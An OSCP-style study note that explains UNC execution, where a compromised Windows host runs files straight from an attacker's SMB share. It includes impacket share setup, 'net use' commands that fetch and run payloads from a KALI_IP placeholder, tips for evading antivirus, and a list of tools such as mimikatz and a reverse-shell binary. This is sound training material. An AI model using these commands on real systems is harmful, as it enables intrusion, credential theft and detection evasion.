# **UNC Execution & SMB-Based File Execution (OSCP)**

**UNC execution** is a technique where a Windows machine executes a file **directly from a network share** (SMB), instead of downloading it first. No file is saved to disk on the target — you run it straight from your Kali share.

This is **not a first foothold technique**. Use it after you already have command execution on a Windows host and want to run tools quickly without staging files.

---

## **What UNC Means**

UNC = **Universal Naming Convention**

Format: `\\ATTACKER_IP\share\file.exe`
Example: `\\192.168.45.240\share\winPEASx64.exe`

When the target runs that path:
- It connects to your SMB share on port **445**
- Pulls the file over the network
- Executes it immediately
- Nothing is written to disk on the target

---

## **Hosting the SMB Share (Kali Side)**

Modern Windows rejects anonymous SMB connections by default. The basic command will silently fail — always add credentials:

```bash
# Always use this version — sets a username/password the target authenticates with
impacket-smbserver share . -smb2support -username user -password pass
```

The `-smb2support` flag is required for Windows 10 and Server 2016+. Without it the connection is refused.

Run this from the directory containing the files you want to serve.

---

## **Executing From the Target**

UNC is a Windows path format — Windows resolves `\\IP\share\file` the same way regardless of where you type it. It works in every Windows execution context:

| Access you have | Where you type the UNC path |
|---|---|
| Reverse shell / cmd shell | Directly at the `C:\>` prompt |
| PowerShell session | Directly at the `PS>` prompt |
| RDP access | File Explorer address bar, Win+R dialog, or open cmd from RDP |
| Webshell / command injection | Pass it as the command to execute |

**Step 1 — Authenticate to the share first (required on modern Windows):**

```cmd
net use \\<KALI_IP>\share /user:user pass
```

Windows rejects anonymous SMB by default. This maps your Kali share and stores the credentials so the next step doesn't prompt or fail.

**Step 2 — Execute the file:**

```cmd
\\<KALI_IP>\share\payload.exe
```

**Combined into one line:**
```cmd
net use \\<KALI_IP>\share /user:user pass && \\<KALI_IP>\share\winPEASx64.exe
```

---

## **Failure Modes**

| Symptom | Likely cause | Fix |
|---|---|---|
| No connection at all | Port 445 blocked outbound from target | Switch to HTTP (`certutil` / PowerShell) |
| `Access denied` | Anonymous auth rejected | Add `-username` and `-password` to impacket, use `net use` on target |
| Connection made but file won't run | AV blocked execution | Rename the file, use obfuscated version, or use HTTP download instead |
| `The network path was not found` | Wrong IP or share name | Verify your tun0 IP and the share name matches |

If UNC is blocked, fall back to HTTP download — see [[File_Transfer]].

---

## **When to Use This**

- You have a shell or RDP and want to run a tool without writing to disk
- You're moving laterally and want a fast way to execute on a new host
- You want to avoid leaving artifacts on disk (winPEAS, mimikatz, etc.)

---

## **Common Files You'd Run This Way**

| File | Purpose |
|---|---|
| `winPEASx64.exe` | Windows privesc enumeration |
| `Seatbelt.exe` | Host enumeration |
| `SharpHound.exe` | AD enumeration for BloodHound |
| `mimikatz.exe` | Credential extraction |
| `ligolo-agent.exe` | Tunneling agent for pivoting |
| `rev.exe` | Reverse shell payload |

---

## **Related Notes**

- [[File_Transfer]]
- [[Mimikatz]]
